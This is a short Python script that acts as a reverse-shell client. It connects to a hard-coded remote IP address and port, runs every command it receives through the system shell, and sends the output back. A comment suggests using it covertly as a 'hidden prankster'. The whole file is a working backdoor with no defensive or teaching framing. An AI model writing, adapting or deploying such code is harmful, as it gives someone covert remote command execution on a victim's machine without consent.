"""This file used to and connects to server 
using socket connection"""

import socket
import os
import subprocess

s = socket.socket()
host = '10.94.241.17'  #give ip of server
port = 9999

s.connect((host, port))
#print("Connection Done")

while True:
    try:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8")) 

        if len(data) > 0:
            cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

            """Don't write below code if you want to be a hidden prankster"""
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            work_Dir = os.getcwd() + "> "
            message = f"{output_str} + {work_Dir}"
            s.send(message.encode("utf-8"))

            # to see output in client's terminal also 
            #print(output_str)

    except KeyboardInterrupt:
        s.close()
        #print("Server DOWN")

